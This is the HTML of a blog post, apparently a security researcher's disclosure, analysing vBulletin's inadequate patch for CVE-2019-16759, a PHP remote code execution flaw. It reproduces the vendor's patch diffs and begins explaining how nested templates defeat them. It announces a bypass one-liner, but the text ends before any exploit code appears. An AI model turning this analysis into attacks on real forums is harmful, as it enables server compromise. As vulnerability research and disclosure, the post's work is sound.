<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Exploitee.rs  &raquo; Blog Archive   &raquo; Exploiting vBulletin: &#8220;A Tale of a Patch Fail&#8221;</title>
<link rel="stylesheet" href="/wp-content/themes/clean-home/reset.css" type="text/css" media="screen" />
<link rel="stylesheet" href="/wp-content/themes/clean-home/style.css" type="text/css" media="screen" />
<!--[if IE]><link rel="stylesheet" href="/wp-content/themes/clean-home/ie.css" type="text/css" media="screen" /><![endif]-->
<link rel="alternate" type="application/rss+xml" title="Exploitee.rs RSS Feed" href="/feed/" />
<link rel="pingback" href="/xmlrpc.php" />
<link rel="shortcut icon" href="www.exploitee.rs/favicon.ico" />
<meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Exploitee.rs &raquo; Exploiting vBulletin: &#8220;A Tale of a Patch Fail&#8221; Comments Feed" href="/2020/exploiting-vbulletin-a-tale-of-patch-fail/feed/" />
<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.8"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='/wp-includes/css/dist/block-library/style.min.css?ver=5.8' type='text/css' media='all' />
<link rel='stylesheet' id='wp-syntax-css-css' href='/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.1' type='text/css' media='all' />
<link rel='stylesheet' id='tablepress-default-css' href='/wp-content/plugins/tablepress/css/default.min.css?ver=1.14' type='text/css' media='all' />
<script type='text/javascript' src='/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
<script type='text/javascript' src='/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<link rel="https://api.w.org/" href="/wp-json/" /><link rel="alternate" type="application/json" href="/wp-json/wp/v2/posts/870" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/wp-includes/wlwmanifest.xml" />
<meta name="generator" content="WordPress 5.8" />
<link rel="canonical" href="/2020/exploiting-vbulletin-a-tale-of-patch-fail/" />
<link rel='shortlink' href='/?p=870' />
<link rel="alternate" type="application/json+oembed" href="/wp-json/oembed/1.0/embed?url=%2F2020%2Fexploiting-vbulletin-a-tale-of-patch-fail%2F" />
<link rel="alternate" type="text/xml+oembed" href="/wp-json/oembed/1.0/embed?url=%2F2020%2Fexploiting-vbulletin-a-tale-of-patch-fail%2F&#038;format=xml" />
</head>
<body>
<div id="wrapper">
<div id="header">
<div id="logo">
<h1><a href=""><img src="/images/Logo.svg" width="350px" /></a></h1>

</div>
<div id="nav">
<ul>
<li><a href="https://blog.exploitee.rs">Home</a></li><li><a href="http://exploitee.rs">Wiki</a></li><li><a href="http://forum.exploitee.rs">Forum</a></li>
</ul>
</div>
</div>

<div id="content">
<div class="post">
<h1><a href="/2020/exploiting-vbulletin-a-tale-of-patch-fail/">Exploiting vBulletin: &#8220;A Tale of a Patch Fail&#8221;</a></h1>
<small><b>Posted:</b> August 9th, 2020 | <b>Author:</b> <a href="/author/zenofex/" title="Posts by zenofex" rel="author">zenofex</a> | <b>Filed under:</b> <a href="/category/uncategorized/" rel="category tag">Uncategorized</a> | <a href="/2020/exploiting-vbulletin-a-tale-of-patch-fail/#comments">1 Comment &#187;</a></small>
<p>On September 23, 2019 <a href="https://seclists.org/fulldisclosure/2019/Sep/31">an undisclosed researcher released a bug which allowed for PHP remote code execution in vBulletin 5.0 through 5.4</a>. This bug (CVE-2019-16759) was labeled as a &#8216;bugdoor&#8217; because of its simplicity by a <a href="https://twitter.com/cbekrar/status/1176803541047861249?">popular vulnerability broker</a> and was marked with a <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16759">CVSS 3.x score of 9.8</a> giving it a critical rating. </p>
<p>Today, we&#8217;re going to talk about how the patch that was supplied for the vulnerability was inadequate in blocking exploitation, show how to bypass the resulting fix, and releasing a bash one-liner resulting in remote code execution in the latest vBulletin software.</p>
<h2>CVE-2019-16759</h2>
<p>The vulnerability mentioned above was later formally labeled &#8220;CVE-2019-16759&#8221; and a patch was issued on September 25, 2019. Although the patch was provided in just under 3 days, the patch seemed, at the time, to fix the proof of concept exploit provided by the un-named finder. </p>
<p>The patch(s) consisted of three main changes provided in 2 sets of patches, the first being shown below.</p>
<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
</pre></td><td class="code"><pre class="php" style="font-family:monospace;">         <span style="color: #009933; font-style: italic;">/**
          *      Remove any problematic values from the template
          *      variable arrays before rendering
          */</span>
         <span style="color: #666666; font-style: italic;">//for now don't pass the values through.  These arrays are potentially large</span>
         <span style="color: #666666; font-style: italic;">//and we don't want to make unnecesary copies.  The alternative is to pass by</span>
         <span style="color: #666666; font-style: italic;">//reference which causes it's own headaches.  It's an internal function and the</span>
         <span style="color: #666666; font-style: italic;">//relevant arrays are all class variables.</span>
         <span style="color: #000000; font-weight: bold;">private</span> <span style="color: #000000; font-weight: bold;">function</span> cleanRegistered<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span>
         <span style="color: #009900;">&#123;</span>   
                 <span style="color: #000088;">$disallowedNames</span> <span style="color: #339933;">=</span> <span style="color: #990000;">array</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'widgetConfig'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
                 <span style="color: #b1b100;">foreach</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$disallowedNames</span> <span style="color: #b1b100;">AS</span> <span style="color: #000088;">$name</span><span style="color: #009900;">&#41;</span>
                 <span style="color: #009900;">&#123;</span>   
                         <span style="color: #990000;">unset</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$this</span><span style="color: #339933;">-&gt;</span><span style="color: #004000;">registered</span><span style="color: #009900;">&#91;</span><span style="color: #000088;">$name</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
                         <span style="color: #990000;">unset</span><span style="color: #009900;">&#40;</span><span style="color: #000000; font-weight: bold;">self</span><span style="color: #339933;">::</span><span style="color: #000088;">$globalRegistered</span><span style="color: #009900;">&#91;</span><span style="color: #000088;">$name</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
                 <span style="color: #009900;">&#125;</span>
         <span style="color: #009900;">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;"> /**
* Remove any problematic values from the template
* variable arrays before rendering
*/
//for now don't pass the values through. These arrays are potentially large
//and we don't want to make unnecesary copies. The alternative is to pass by
//reference which causes it's own headaches. It's an internal function and the
//relevant arrays are all class variables.
private function cleanRegistered()
{
$disallowedNames = array('widgetConfig');
foreach($disallowedNames AS $name)
{
unset($this-&gt;registered[$name]);
unset(self::$globalRegistered[$name]);
}
}</p></div>
<p>The above function was added but unfortunately had to be obtained from the code as opposed to directly from a diff between the two coded bases. This is because vBulletin doesn&#8217;t provide the older insecure versions of their software after a patch is released. Therefore, the above code was pulled directly from 5.5.4 Patch Level 2. </p>
<p>The above &#8220;cleanRegistered&#8221; function was added as the first fix to the vulnerability and simply iterates through a list of non-allowed &#8220;registered variables&#8221;, deleting their contents when found. This list when added only contained the name of the single variable which contained the php code to execute in the released exploit.</p>
<p>In the next version of the software (vBulletin 5.5.5), the following pieces were added to further prevent future problems with the widget_rendering template code.</p>
<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="code"><pre class="php" style="font-family:monospace;">diff <span style="color: #339933;">-</span>ur vBulletin<span style="color: #339933;">/</span>vBulletin<span style="color: #339933;">/</span>vb5_connect<span style="color: #339933;">/</span>vBulletin<span style="color: #339933;">-</span>5<span style="color: #339933;">.</span>5<span style="color: #339933;">.</span>4_Patch_Level_2<span style="color: #339933;">/</span>upload<span style="color: #339933;">/</span>includes<span style="color: #339933;">/</span>vb5<span style="color: #339933;">/</span>frontend<span style="color: #339933;">/</span>applicationlight<span style="color: #339933;">.</span>php vBulletin<span style="color: #339933;">/</span>vBulletin<span style="color: #339933;">/</span>vb5_connect<span style="color: #339933;">/</span>vBulletin<span style="color: #339933;">-</span>5<span style="color: #339933;">.</span>5<span style="color: #339933;">.</span>5<span style="color: #339933;">/</span>upload<span style="color: #339933;">/</span>includes<span style="color: #339933;">/</span>vb5<span style="color: #339933;">/</span>frontend<span style="color: #339933;">/</span>applicationlight<span style="color: #339933;">.</span>php
<span style="color: #339933;">---</span> vBulletin<span style="color: #339933;">/</span>vBulletin<span style="color: #339933;">/</span>vb5_connect<span style="color: #339933;">/</span>vBulletin<span style="color: #339933;">-</span>5<span style="color: #339933;">.</span>5<span style="color: #339933;">.</span>4_Patch_Level_2<span style="color: #339933;">/</span>upload<span style="color: #339933;">/</span>includes<span style="color: #339933;">/</span>vb5<span style="color: #339933;">/</span>frontend<span style="color: #339933;">/</span>applicationlight<span style="color: #339933;">.</span>php	<span style="color: #cc66cc;">2020</span><span style="color: #339933;">-</span><span style="color:#800080;">08</span><span style="color: #339933;">-</span><span style="color:#800080;">08</span> <span style="color: #208080;">06</span><span style="color: #339933;">:</span><span style="color: #cc66cc;">40</span><span style="color: #339933;">:</span><span style="color:#800080;">31.356918994</span> <span style="color: #339933;">-</span><span style="color: #208080;">0500</span>
<span style="color: #339933;">+++</span> vBulletin<span style="color: #339933;">/</span>vBulletin<span style="color: #339933;">/</span>vb5_connect<span style="color: #339933;">/</span>vBulletin<span style="color: #339933;">-</span>5<span style="color: #339933;">.</span>5<span style="color: #339933;">.</span>5<span style="color: #339933;">/</span>upload<span style="color: #339933;">/</span>includes<span style="color: #339933;">/</span>vb5<span style="color: #339933;">/</span>frontend<span style="color: #339933;">/</span>applicationlight<span style="color: #339933;">.</span>php	<span style="color: #cc66cc;">2020</span><span style="color: #339933;">-</span><span style="color:#800080;">08</span><span style="color: #339933;">-</span><span style="color:#800080;">08</span> <span style="color: #208080;">06</span><span style="color: #339933;">:</span><span style="color: #cc66cc;">40</span><span style="color: #339933;">:</span><span style="color:#800080;">40.577517014</span> <span style="color: #339933;">-</span><span style="color: #208080;">0500</span>
<span style="color: #339933;">@@</span> <span style="color: #339933;">-</span><span style="color: #cc66cc;">286</span><span style="color: #339933;">,</span><span style="color: #cc66cc;">20</span> <span style="color: #339933;">+</span><span style="color: #cc66cc;">286</span><span style="color: #339933;">,</span><span style="color: #cc66cc;">32</span> <span style="color: #339933;">@@</span>
 			<span style="color: #b1b100;">throw</span> <span style="color: #000000; font-weight: bold;">new</span> vB5_Exception_Api<span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'ajax'</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">'render'</span><span style="color: #339933;">,</span> <span style="color: #990000;">array</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">'invalid_request'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
 		<span style="color: #009900;">&#125;</span>
&nbsp;
<span style="color: #339933;">-</span>		<span style="color: #000088;">$this</span><span style="color: #339933;">-&gt;</span><span style="color: #004000;">router</span> <span style="color: #339933;">=</span> <span style="color: #000000; font-weight: bold;">new</span> vB5_Frontend_Routing<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">-</span>		<span style="color: #000088;">$this</span><span style="color: #339933;">-&gt;</span><span style="color: #004000;">router</span><span style="color: #339933;">-&gt;</span><span style="color: #004000;">setRouteInfo</span><span style="color: #009900;">&#40;</span><span style="color: #990000;">array</span><span style="color: #009900;">&#40;</span>
<span style="color: #339933;">-</span>			<span style="color: #0000ff;">'action'</span>          <span style="color: #339933;">=&gt;</span> <span style="color: #0000ff;">'actionRender'</span><span style="color: #339933;">,</span>
<span style="color: #339933;">-</span>			<span style="color: #0000ff;">'arguments'</span>       <span style="color: #339933;">=&gt;</span> <span style="color: #000088;">$serverData</span><span style="color: #339933;">,</span>
<span style="color: #339933;">-</span>			<span style="color: #0000ff;">'template'</span>        <span style="color: #339933;">=&gt;</span> <span style="color: #000088;">$routeInfo</span><span style="color: #009900;">&#91;</span><span style="color: #cc66cc;">2</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">,</span>
<span style="color: #339933;">-</span>			<span style="color: #666666; font-style: italic;">// this use of $_GET appears to be fine,</span>
<span style="color: #339933;">-</span>			<span style="color: #666666; font-style: italic;">// since it's setting the route query params</span>
<span style="color: #339933;">-</span>			<span style="color: #666666; font-style: italic;">// not sending the data to the template</span>
<span style="color: #339933;">-</span>			<span style="color: #666666; font-style: italic;">// render</span>
<span style="color: #339933;">-</span>			<span style="color: #0000ff;">'queryParameters'</span> <span style="color: #339933;">=&gt;</span> <span style="color: #000088;">$_GET</span><span style="color: #339933;">,</span>
<span style="color: #339933;">-</span>		<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">-</span>		Api_InterfaceAbstract<span style="color: #339933;">::</span><span style="color: #004000;">setLight</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">+</span>		<span style="color: #000088;">$templateName</span> <span style="color: #339933;">=</span> <span style="color: #000088;">$routeInfo</span><span style="color: #009900;">&#91;</span><span style="color: #cc66cc;">2</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">+</span>		<span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #000088;">$templateName</span> <span style="color: #339933;">==</span> <span style="color: #0000ff;">'widget_php'</span><span style="color: #009900;">&#41;</span>
<span style="color: #339933;">+</span>		<span style="color: #009900;">&#123;</span>
<span style="color: #339933;">+</span>			<span style="color: #000088;">$result</span> <span style="color: #339933;">=</span> <span style="color: #990000;">array</span><span style="color: #009900;">&#40;</span>
<span style="color: #339933;">+</span>				<span style="color: #0000ff;">'template'</span> <span style="color: #339933;">=&gt;</span> <span style="color: #0000ff;">''</span><span style="color: #339933;">,</span>
<span style="color: #339933;">+</span>				<span style="color: #0000ff;">'css_links'</span> <span style="color: #339933;">=&gt;</span> <span style="color: #990000;">array</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span>
<span style="color: #339933;">+</span>			<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">+</span>		<span style="color: #009900;">&#125;</span>
<span style="color: #339933;">+</span>		<span style="color: #b1b100;">else</span>
<span style="color: #339933;">+</span>		<span style="color: #009900;">&#123;</span>
<span style="color: #339933;">+</span>			<span style="color: #000088;">$this</span><span style="color: #339933;">-&gt;</span><span style="color: #004000;">router</span> <span style="color: #339933;">=</span> <span style="color: #000000; font-weight: bold;">new</span> vB5_Frontend_Routing<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">+</span>			<span style="color: #000088;">$this</span><span style="color: #339933;">-&gt;</span><span style="color: #004000;">router</span><span style="color: #339933;">-&gt;</span><span style="color: #004000;">setRouteInfo</span><span style="color: #009900;">&#40;</span><span style="color: #990000;">array</span><span style="color: #009900;">&#40;</span>
<span style="color: #339933;">+</span>				<span style="color: #0000ff;">'action'</span>          <span style="color: #339933;">=&gt;</span> <span style="color: #0000ff;">'actionRender'</span><span style="color: #339933;">,</span>
<span style="color: #339933;">+</span>				<span style="color: #0000ff;">'arguments'</span>       <span style="color: #339933;">=&gt;</span> <span style="color: #000088;">$serverData</span><span style="color: #339933;">,</span>
<span style="color: #339933;">+</span>				<span style="color: #0000ff;">'template'</span>        <span style="color: #339933;">=&gt;</span> <span style="color: #000088;">$templateName</span><span style="color: #339933;">,</span>
<span style="color: #339933;">+</span>				<span style="color: #666666; font-style: italic;">// this use of $_GET appears to be fine,</span>
<span style="color: #339933;">+</span>				<span style="color: #666666; font-style: italic;">// since it's setting the route query params</span>
<span style="color: #339933;">+</span>				<span style="color: #666666; font-style: italic;">// not sending the data to the template</span>
<span style="color: #339933;">+</span>				<span style="color: #666666; font-style: italic;">// render</span>
<span style="color: #339933;">+</span>				<span style="color: #0000ff;">'queryParameters'</span> <span style="color: #339933;">=&gt;</span> <span style="color: #000088;">$_GET</span><span style="color: #339933;">,</span>
<span style="color: #339933;">+</span>			<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">+</span>			Api_InterfaceAbstract<span style="color: #339933;">::</span><span style="color: #004000;">setLight</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">+</span>			<span style="color: #000088;">$result</span> <span style="color: #339933;">=</span> vB5_Template<span style="color: #339933;">::</span><span style="color: #004000;">staticRenderAjax</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$templateName</span><span style="color: #339933;">,</span> <span style="color: #000088;">$serverData</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">+</span>		<span style="color: #009900;">&#125;</span>
&nbsp;
<span style="color: #339933;">-</span>		<span style="color: #000088;">$this</span><span style="color: #339933;">-&gt;</span><span style="color: #004000;">sendAsJson</span><span style="color: #009900;">&#40;</span>vB5_Template<span style="color: #339933;">::</span><span style="color: #004000;">staticRenderAjax</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$routeInfo</span><span style="color: #009900;">&#91;</span><span style="color: #cc66cc;">2</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #000088;">$serverData</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">+</span>		<span style="color: #000088;">$this</span><span style="color: #339933;">-&gt;</span><span style="color: #004000;">sendAsJson</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$result</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
 	<span style="color: #009900;">&#125;</span>
&nbsp;
 	<span style="color: #666666; font-style: italic;">/**</span></pre></td></tr></table><p class="theCode" style="display:none;">diff -ur vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/frontend/applicationlight.php
--- vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php	2020-08-08 06:40:31.356918994 -0500
+++ vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/frontend/applicationlight.php	2020-08-08 06:40:40.577517014 -0500
@@ -286,20 +286,32 @@
throw new vB5_Exception_Api('ajax', 'render', array(), 'invalid_request');
}
- $this-&gt;router = new vB5_Frontend_Routing();
- $this-&gt;router-&gt;setRouteInfo(array(
- 'action' =&gt; 'actionRender',
- 'arguments' =&gt; $serverData,
- 'template' =&gt; $routeInfo[2],
- // this use of $_GET appears to be fine,
- // since it's setting the route query params
- // not sending the data to the template
- // render
- 'queryParameters' =&gt; $_GET,
- ));
- Api_InterfaceAbstract::setLight();
+ $templateName = $routeInfo[2];
+ if ($templateName == 'widget_php')
+ {
+ $result = array(
+ 'template' =&gt; '',
+ 'css_links' =&gt; array(),
+ );
+ }
+ else
+ {
+ $this-&gt;router = new vB5_Frontend_Routing();
+ $this-&gt;router-&gt;setRouteInfo(array(
+ 'action' =&gt; 'actionRender',
+ 'arguments' =&gt; $serverData,
+ 'template' =&gt; $templateName,
+ // this use of $_GET appears to be fine,
+ // since it's setting the route query params
+ // not sending the data to the template
+ // render
+ 'queryParameters' =&gt; $_GET,
+ ));
+ Api_InterfaceAbstract::setLight();
+ $result = vB5_Template::staticRenderAjax($templateName, $serverData);
+ }
- $this-&gt;sendAsJson(vB5_Template::staticRenderAjax($routeInfo[2], $serverData));
+ $this-&gt;sendAsJson($result);
}
/**</p></div>
<p>This portion of the patch created an if statement that would return empty template or css data if the &#8216;widget_php&#8217; template was listed as the last portion of the route. These two changes prevented the PoC from functioning in its released state. </p>
<p>The third change can be found in the second part of the vBulletin 5.5.5 update diff.</p>
<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre></td><td class="code"><pre class="diff" style="font-family:monospace;"> 	diff -ur vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php
<span style="color: #888822;">--- vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/template/runtime.php	2020-08-08 06:40:31.276913797 -0500</span>
<span style="color: #888822;">+++ vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php	2020-08-08 06:40:40.493511575 -0500</span>
<span style="color: #440088;">@@ -12,6 +12,26 @@</span>
&nbsp;
 class vB5_Template_Runtime
 <span style="">&#123;</span>
<span style="color: #00b000;">+	//This is intended to allow the runtime to know that template it is rendering.</span>
<span style="color: #00b000;">+	//It's ugly and shouldn't be used lightly, but making some features widely</span>
<span style="color: #00b000;">+	//available to all templates is uglier.</span>
<span style="color: #00b000;">+	private static $templates = array<span style="">&#40;</span><span style="">&#41;</span>;</span>
<span style="color: #00b000;">+</span>
<span style="color: #00b000;">+	public static function startTemplate<span style="">&#40;</span>$template<span style="">&#41;</span></span>
<span style="color: #00b000;">+	<span style="">&#123;</span></span>
<span style="color: #00b000;">+		array_push<span style="">&#40;</span>self::$templates, $template<span style="">&#41;</span>;</span>
<span style="color: #00b000;">+	<span style="">&#125;</span></span>
<span style="color: #00b000;">+</span>
<span style="color: #00b000;">+	public static function endTemplate<span style="">&#40;</span><span style="">&#41;</span></span>
<span style="color: #00b000;">+	<span style="">&#123;</span></span>
<span style="color: #00b000;">+		array_pop<span style="">&#40;</span>self::$templates<span style="">&#41;</span>;</span>
<span style="color: #00b000;">+	<span style="">&#125;</span></span>
<span style="color: #00b000;">+</span>
<span style="color: #00b000;">+	private static function currentTemplate<span style="">&#40;</span><span style="">&#41;</span></span>
<span style="color: #00b000;">+	<span style="">&#123;</span></span>
<span style="color: #00b000;">+		return end<span style="">&#40;</span>self::$templates<span style="">&#41;</span>;</span>
<span style="color: #00b000;">+	<span style="">&#125;</span></span>
<span style="color: #00b000;">+</span>
 	public static $units = array<span style="">&#40;</span>
 		'%',
 		'px',
<span style="color: #440088;">@@ -1944,6 +1964,21 @@</span>
 			return '&lt;div style=&quot;border:1px solid red;padding:10px;margin:10px;&quot;&gt;' . htmlspecialchars<span style="">&#40;</span>$timerName<span style="">&#41;</span> . ': ' . $elapsed . '&lt;/div&gt;';
 		<span style="">&#125;</span>
 	<span style="">&#125;</span>
<span style="color: #00b000;">+</span>
<span style="color: #00b000;">+	public static function evalPhp<span style="">&#40;</span>$code<span style="">&#41;</span></span>
<span style="color: #00b000;">+	<span style="">&#123;</span></span>
<span style="color: #00b000;">+		//only allow the PHP widget template to do this.  This prevents a malicious user</span>
<span style="color: #00b000;">+		//from hacking something into a different template.</span>
<span style="color: #00b000;">+		if <span style="">&#40;</span>self::currentTemplate<span style="">&#40;</span><span style="">&#41;</span> != 'widget_php'<span style="">&#41;</span></span>
<span style="color: #00b000;">+		<span style="">&#123;</span></span>
<span style="color: #00b000;">+			return '';</span>
<span style="color: #00b000;">+		<span style="">&#125;</span></span>
<span style="color: #00b000;">+		ob_start<span style="">&#40;</span><span style="">&#41;</span>;</span>
<span style="color: #00b000;">+		eval<span style="">&#40;</span>$code<span style="">&#41;</span>;</span>
<span style="color: #00b000;">+		$output = ob_get_contents<span style="">&#40;</span><span style="">&#41;</span>;</span>
<span style="color: #00b000;">+		ob_end_clean<span style="">&#40;</span><span style="">&#41;</span>;</span>
<span style="color: #00b000;">+		return $output;</span>
<span style="color: #00b000;">+	<span style="">&#125;</span></span>
 <span style="">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;"> diff -ur vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php
--- vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/template/runtime.php	2020-08-08 06:40:31.276913797 -0500
+++ vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php	2020-08-08 06:40:40.493511575 -0500
@@ -12,6 +12,26 @@
class vB5_Template_Runtime
{
+	//This is intended to allow the runtime to know that template it is rendering.
+	//It's ugly and shouldn't be used lightly, but making some features widely
+	//available to all templates is uglier.
+	private static $templates = array();
+
+	public static function startTemplate($template)
+	{
+ array_push(self::$templates, $template);
+	}
+
+	public static function endTemplate()
+	{
+ array_pop(self::$templates);
+	}
+
+	private static function currentTemplate()
+	{
+ return end(self::$templates);
+	}
+
public static $units = array(
'%',
'px',
@@ -1944,6 +1964,21 @@
return '&lt;div style=&quot;border:1px solid red;padding:10px;margin:10px;&quot;&gt;' . htmlspecialchars($timerName) . ': ' . $elapsed . '&lt;/div&gt;';
}
}
+
+	public static function evalPhp($code)
+	{
+ //only allow the PHP widget template to do this. This prevents a malicious user
+ //from hacking something into a different template.
+ if (self::currentTemplate() != 'widget_php')
+ {
+ return '';
+ }
+ ob_start();
+ eval($code);
+ $output = ob_get_contents();
+ ob_end_clean();
+ return $output;
+	}
}</p></div>
<p>This portion was added as a layer of redundancy to attempt to prevent any non &#8216;widget_php&#8217; template from loading the eval code. Based on the comment in the code, this is an attempt to prevent a user from modifying a template to incorrectly call the &#8216;evalPhp&#8217; without doing so from an embedded php widget.</p>
<h2>Problems Ahead</h2>
<p>The problem with the above arises because of how the vBulletin template system is structured. Specifically, templates aren&#8217;t actually written in PHP but instead are written in a language that is first processed by the template engine and then is output as a string of PHP code that is later ran through an eval() during the &#8220;rendering&#8221; process. Templates are also not a standalone item but can be nested within other templates, in that one template can have a number of child templates embedded within. For example, take the following template.</p>
<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
